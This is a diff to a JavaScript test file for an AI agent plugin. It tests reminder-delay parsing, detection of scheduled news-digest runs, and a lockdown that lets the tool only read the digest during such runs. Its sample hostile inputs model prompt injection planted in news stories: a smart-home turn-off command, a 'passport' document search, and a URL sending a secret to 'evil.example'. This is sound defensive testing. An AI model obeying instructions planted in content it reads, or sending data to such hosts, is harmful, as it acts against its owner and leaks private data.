@@ -1,6 +1,8 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
-import { createTaskHooks, REMINDER_HINT, REMINDER_MARK, reminderHint, reminderJob } from '../plugin/integration-tasks.mjs';
+import fs from 'node:fs';
+import { createTaskHooks, cronJobOfSession, DIGEST_DESCRIPTION, REMINDER_HINT, REMINDER_MARK, reminderHint, reminderJob } from '../plugin/integration-tasks.mjs';
+import { createIntegrationTools } from '../plugin/integrations.mjs';
 
 function recorder(replies) {
   const sent = [];
@@ -205,5 +207,71 @@ test('a reminder hint uses the delay the owner asked for, so the model never cop
   assert.equal(minutes('Lembre-me daqui a 10 minutos'), 10);
   assert.equal(minutes('Me lembre em 2 horas'), 120);
   assert.equal(minutes('Lembra-me daqui a 10 minutos de beber água'), 10);
+  // Every part of a delay counts: the model copies the number as is.
+  assert.equal(minutes('Remind me in 1 hour 30 minutes to leave'), 90);
+  assert.equal(minutes('remind me in 1h 30m'), 90);
+  assert.equal(minutes('remind me in 2 hours and 15 minutes'), 135);
+  assert.equal(minutes('Lembra-me daqui a 1 hora e 30 minutos'), 90);
+  assert.equal(minutes('Remind me in 10 minutes to call 2 people'), 10, 'a later number that is no delay is not added');
   assert.match(reminderHint('Remind me in 3 minutes'), /tool_call with id "openclaw:pixel-ods:pixel_ods_notify"/);
+});
+
+test('the digest description is the service\'s own', () => {
+  const service = fs.readFileSync(new URL('../host/integrations_apps.py', import.meta.url), 'utf8');
+  assert.ok(service.includes(`DIGEST_MARKER = "${DIGEST_DESCRIPTION}"`));
+  assert.equal(cronJobOfSession('agent:pixel:cron:4F2a-9c'), '4f2a-9c');
+  assert.equal(cronJobOfSession('agent:pixel:cron:job-1:run:1793816393'), 'job-1');
+  for (const other of ['agent:pixel:openai-user:ods-' + 'a'.repeat(64), 'agent:pixel:main', '', undefined]) assert.equal(cronJobOfSession(other), '');
+});
+
+test('a digest run is known from the sync, its start, or the scheduler; chats and other tasks are not digest runs', async () => {
+  const {submit} = recorder(() => ({ok: true, plan: PLAN}));
+  const cron = fakeCron([{id: 'Nightly-Backup', description: 'Back up the photos'}]);
+  const hooks = createTaskHooks({submit, timers: {setInterval: () => ({}), clearInterval: () => {}}, shared: {}});
+  await hooks.gatewayStart({}, {getCron: () => cron});
+  const digestId = cron.jobs.find(job => job.description === DIGEST_DESCRIPTION).id;
+  assert.equal(await hooks.isDigestRun(`agent:pixel:cron:${digestId}`), true);
+  assert.equal(await hooks.isDigestRun('agent:pixel:cron:nightly-backup'), false);
+  assert.equal(await hooks.isDigestRun('agent:pixel:openai-user:ods-' + 'a'.repeat(64)), false);
+  assert.equal(await hooks.isDigestRun('agent:pixel:cron:vanished'), true, 'a run nobody can name may only read the digest');
+  // Seen when it starts, before its run calls a tool.
+  const started = createTaskHooks({submit, shared: {}});
+  await started.cronChanged({action: 'started', jobId: 'D9', agentId: 'pixel', job: {description: DIGEST_DESCRIPTION}});
+  assert.equal(await started.isDigestRun('agent:pixel:cron:d9'), true);
+  // Asked of the scheduler when the hooks never saw it.
+  const fresh = createTaskHooks({submit, shared: {}});
+  await fresh.gatewayStart({}, {getCron: () => fakeCron([{id: 'late', description: DIGEST_DESCRIPTION}])});
+  assert.equal(await fresh.isDigestRun('agent:pixel:cron:late'), true);
+});
+
+test('in the digest run, the app tool reads the digest and nothing else', async () => {
+  const sent = [];
+  const submit = async payload => { sent.push(payload); return {ok: true, text: 'Stories', isError: false, servers: []}; };
+  const mcp = isDigestRun => createIntegrationTools({submit, sessionKey: 'agent:pixel:cron:d1', isDigestRun}).find(tool => tool.name === 'pixel_ods_mcp');
+  const digest = mcp(async () => true);
+  // A story that says "turn the heating off" or "watch this page" gets nowhere.
+  for (const params of [{action: 'list'}, {action: 'call', server: 'home', tool: 'HassTurnOff', arguments: {name: 'heating'}},
+    {action: 'call', server: 'watch', tool: 'add', arguments: {url: 'https://evil.example/?d=secret'}},
+    {action: 'call', server: 'documents', tool: 'search', arguments: {query: 'passport'}}]) {
+    const refused = await digest.execute('1', params);
+    assert.equal(refused.isError, true, JSON.stringify(params));
+    assert.match(refused.content[0].text, /may only read the digest/);
+  }
+  assert.deepEqual(sent, []);
+  const read = await digest.execute('2', {action: 'call', server: 'news', tool: 'digest', arguments: {limit: 9999, extra: 'x'}});
+  assert.equal(read.content[0].text, 'Stories');
+  assert.deepEqual(sent, [{action: 'mcp-call', server: 'news', tool: 'digest', arguments: {}}]);
+  // Anywhere else the tool works as before.
+  await mcp(async () => false).execute('3', {action: 'call', server: 'home', tool: 'HassTurnOff', arguments: {name: 'heating'}});
+  assert.deepEqual(sent.at(-1), {action: 'mcp-call', server: 'home', tool: 'HassTurnOff', arguments: {name: 'heating'}});
+});
+
+test('a notification with empty reminder fields is sent now, not refused as a reminder', async () => {
+  const sent = [];
+  const notify = createIntegrationTools({submit: async payload => { sent.push(payload); return {ok: true}; }}).find(tool => tool.name === 'pixel_ods_notify');
+  for (const params of [{message: 'Build done', inMinutes: null, at: null}, {message: 'Build done', at: ''}]) {
+    const reply = await notify.execute('1', params);
+    assert.equal(reply.content[0].text, 'Notification sent.');
+  }
+  assert.deepEqual(sent.map(item => item.action), ['notify', 'notify']);
 });
